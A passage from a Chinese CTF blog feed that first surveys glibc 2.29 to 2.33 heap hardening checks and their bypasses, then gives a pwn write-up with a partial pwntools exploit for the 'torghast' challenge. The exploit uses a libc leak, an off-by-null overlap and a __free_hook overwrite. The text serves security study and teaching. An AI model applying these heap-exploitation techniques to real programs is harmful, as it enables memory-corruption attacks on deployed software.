!= victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了之前就存在的对victim的size检查外,新增:</p><ol><li>对nextchunk的size的检查</li><li>对nextchunk的prev_size与victim的size是否相等的检查</li><li>因为FIFO,对victim的下一个chunk是否为链表头进行检查</li><li>对victim的nextchunk的prev_inuse位检查,是否合理</li></ol><h3 id="unsortedbin移除chunk新增检查"><a href="#unsortedbin移除chunk新增检查" class="headerlink" title="unsortedbin移除chunk新增检查"></a>unsortedbin移除chunk新增检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查链表尾是否完整</p><h3 id="从topchunk切割时增加检查"><a href="#从topchunk切割时增加检查" class="headerlink" title="从topchunk切割时增加检查"></a>从topchunk切割时增加检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查topchunk的size是否合规</p><h2 id="free检查变化-1"><a href="#free检查变化-1" class="headerlink" title="free检查变化"></a>free检查变化</h2><h3 id="tcache新增double-free检查"><a href="#tcache新增double-free检查" class="headerlink" title="tcache新增double free检查"></a>tcache新增double free检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当一个chunk的bk字段被写入了key的话,再次free就会循环检查该链中的所有chunk是否与victim相等,判断double free</p><p><strong>可以通过破坏key绕过</strong></p><h3 id="向低地址合并检查size-unlink前检查"><a href="#向低地址合并检查size-unlink前检查" class="headerlink" title="向低地址合并检查size(unlink前检查)"></a>向低地址合并检查size(unlink前检查)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前向低地址合并都是不检查即将unlink的chunk的size是否等于找到这个chunk的prev_size</p><p>现在新增了这个检查,使得unlink的利用受到多一点的限制</p><p>向高地址合并则没有变化</p><p>且<strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><h3 id="malloc-consolidate新增一处检查"><a href="#malloc-consolidate新增一处检查" class="headerlink" title="malloc_consolidate新增一处检查"></a>malloc_consolidate新增一处检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与向低地址合并检查size相同,只不过由malloc_consolidate触发</p><h2 id="tcache机制变化"><a href="#tcache机制变化" class="headerlink" title="tcache机制变化"></a>tcache机制变化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>可以看到每个节点多了一个字段*key(对应chunk的bk字段)</p><p>在tcahce_put中写e-&gt;key = tcache;</p><p>在tcache_get中写e-&gt;key = NULL;</p><p>主要用于检查double free</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc检查变化-1"><a href="#malloc检查变化-1" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="从unsortedbin取出放入largebin新增检测"><a href="#从unsortedbin取出放入largebin新增检测" class="headerlink" title="从unsortedbin取出放入largebin新增检测"></a>从unsortedbin取出放入largebin新增检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>分别检测fd_nextsize/bk_nextsize链和fd/bk链是否完整</p><p>这个其实应该是2.30加入的</p><h2 id="free检查变化-2"><a href="#free检查变化-2" class="headerlink" title="free检查变化"></a>free检查变化</h2><p>貌似没什么变化</p><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="malloc检查变化-2"><a href="#malloc检查变化-2" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="REMOVE-FB新增对齐检测"><a href="#REMOVE-FB新增对齐检测" class="headerlink" title="REMOVE_FB新增对齐检测"></a>REMOVE_FB新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检测对齐</p><h3 id="fastbin分配取出增加对齐检测"><a href="#fastbin分配取出增加对齐检测" class="headerlink" title="fastbin分配取出增加对齐检测"></a>fastbin分配取出增加对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="fastbin取出放入tcache新增对齐检测"><a href="#fastbin取出放入tcache新增对齐检测" class="headerlink" title="fastbin取出放入tcache新增对齐检测"></a>fastbin取出放入tcache新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="tcache-get新增对齐检测"><a href="#tcache-get新增对齐检测" class="headerlink" title="tcache_get新增对齐检测"></a>tcache_get新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>检测对齐</p><h3 id="tcache-thread-shutdown增加对齐检测"><a href="#tcache-thread-shutdown增加对齐检测" class="headerlink" title="tcache_thread_shutdown增加对齐检测"></a>tcache_thread_shutdown增加对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>同上,虽然不知道这个函数是干什么的</p><h2 id="free检查变化-3"><a href="#free检查变化-3" class="headerlink" title="free检查变化"></a>free检查变化</h2><h3 id="free-tcache新增对齐检测"><a href="#free-tcache新增对齐检测" class="headerlink" title="free-tcache新增对齐检测"></a>free-tcache新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="tcache加密"><a href="#tcache加密" class="headerlink" title="tcache加密!"></a>tcache加密!</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>新增了这两个宏用于加密</p><p><strong>这个加密是半可逆的,再执行一遍可以恢复ptr的值，但无法恢复原始的pos的值。</strong></p><p>在tcache_put中进行加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第一个chunk是没有加密的</p><h2 id="fastbin加密"><a href="#fastbin加密" class="headerlink" title="fastbin加密!"></a>fastbin加密!</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>一样的加密,也同样第一个chunk没有加密</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="malloc检查变化-3"><a href="#malloc检查变化-3" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><p>没什么变化</p><h2 id="free检查变化-4"><a href="#free检查变化-4" class="headerlink" title="free检查变化"></a>free检查变化</h2><h3 id="tcache新增触发提示"><a href="#tcache新增触发提示" class="headerlink" title="tcache新增触发提示"></a>tcache新增触发提示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>)</span><br></pre></td></tr></table></figure><p>之前就有检测,但没有用malloc_printerr触发</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全检查 </tag>
            
            <tag> glibc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunmerWeek3</title>
      <link href="/posts/17172/"/>
      <url>/posts/17172/</url>
      
        <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="2022ciscn-syscall"><a href="#2022ciscn-syscall" class="headerlink" title="2022ciscn-syscall"></a>2022ciscn-syscall</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>看不懂程序在干什么👶</p><h2 id="2022mrctf-ezbash"><a href="#2022mrctf-ezbash" class="headerlink" title="2022mrctf-ezbash"></a>2022mrctf-ezbash</h2><p>今天回家,暂时摸了😛晚点补</p><h2 id="2022春秋杯-torghast"><a href="#2022春秋杯-torghast" class="headerlink" title="2022春秋杯-torghast"></a>2022春秋杯-torghast</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序要进行攻击的话,首先得成功通关关卡</p><p>需要通关有需要先取得GM权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)mp5070[<span class="number">6</span> * dword_504C] &gt; <span class="number">0x5F5E0FE</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     dword_5058 = <span class="number">1</span>;</span><br><span class="line">     LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Welcome GAME MASTER&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到再进行比较的时候事先将mp转为无符号了</p><p>而在购买其他物品时,只比较了金钱是否大于0,而没有比较是否大于价格,可以将变为负数</p><p><strong>取得权限:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>在不合并的前提下释放两个非tcache范围内chunk再取出使他们的bk位置写上堆地址和libc地址,fd位因为一定会被覆盖一些所以不行</p><p>这样就得到了libc地址和堆地址(堆地址用于之后绕过overlap时的unlink,即提供一个已知的地址存储检查的数据)</p><p>程序在edit_player的时候会存在off-by-null漏洞</p><p>可以利用其向前overlap(非tcache chunk)</p><p>从而进一步达到uaf(两个指针指向同一个chunk)</p><p>将free_hook挂载入tcache中,之后取出(注意对应的counts[tc_idx]的值要先拉高)</p><p>之后就是常规的操作了</p><p><strong>exp:</strong></p><p>不知道是不是一开始的交互函数没写好,导致程序交互总是莫名其妙的卡住,五六次使用脚本只有一次符合预期,调试的时候可以说是极其折磨了,不过完成之后又没有了这样的问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Size\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Data\n&#x27;</span>,(content))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Change?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Your Log:&#x27;</span>,content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;User?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">sleep(<span class="number">1</span>)<span class="comment">#这个sleep很关键,去掉了就会卡住,不是很懂原理,大概是减缓交互速度吧</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">game()</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)<span class="comment">#防止两个chunk合并</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">3</span>)</span><br><span class="line">libc_address=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">1</span>)</span><br><span class="line">heap_3=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=libc_address-<span class="number">96</span>-<span class="number">0x1ebb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_3))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">heap_5=heap_3+<span class="number">0x840</span><span class="comment">#调试计算</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_5))<span class="comment">#记录地址</span></span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)<span class="comment">#off-by-null</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x10</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">edit(<span class="number">5</span>,p64(heap_3-<span class="number">0x8</span>)+p64(heap_3)+p64(<span class="number">0x20</span>))<span class="comment">#绕过合并时的unlink检测,prev_size记得填</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#触发合并</span></span><br><span class="line">add(<span class="number">10</span>,<span 